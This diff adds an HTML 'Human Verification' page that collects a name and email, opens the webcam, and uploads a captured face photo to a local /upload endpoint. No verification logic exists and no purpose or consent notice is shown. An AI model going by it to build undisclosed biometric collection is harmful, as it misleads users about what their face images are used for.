@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Human Verification</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:linear-gradient(135deg,#4f46e5,#06b6d4);
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.container{
+    background:white;
+    padding:25px;
+    border-radius:15px;
+    width:350px;
+    text-align:center;
+}
+
+input{
+    width:90%;
+    padding:10px;
+    margin:8px 0;
+    border-radius:8px;
+    border:1px solid #ccc;
+}
+
+video{
+    width:100%;
+    border-radius:10px;
+}
+
+button{
+    background:#4f46e5;
+    color:white;
+    border:none;
+    padding:10px;
+    width:100%;
+    border-radius:8px;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Human Verification</h2>
+
+<input type="text" id="name" placeholder="Enter your name">
+<input type="email" id="email" placeholder="Enter your email">
+
+<video id="video" autoplay></video>
+
+<button onclick="capture()">Verify</button>
+
+<p id="status"></p>
+
+</div>
+
+<script>
+const video = document.getElementById("video");
+
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream=>{
+    video.srcObject = stream;
+});
+
+function capture(){
+
+    const name = document.getElementById("name").value;
+    const email = document.getElementById("email").value;
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0);
+
+    canvas.toBlob(async(blob)=>{
+
+        let formData = new FormData();
+        formData.append("photo", blob, "face.jpg");
+        formData.append("name", name);
+        formData.append("email", email);
+
+        let res = await fetch("/upload", {
+            method:"POST",
+            body:formData
+        });
+
+        if(res.ok){
+            document.getElementById("status").innerText =
+            "Verification Successful!";
+        }
+    });
+}
+</script>
+
+</body>
+</html>
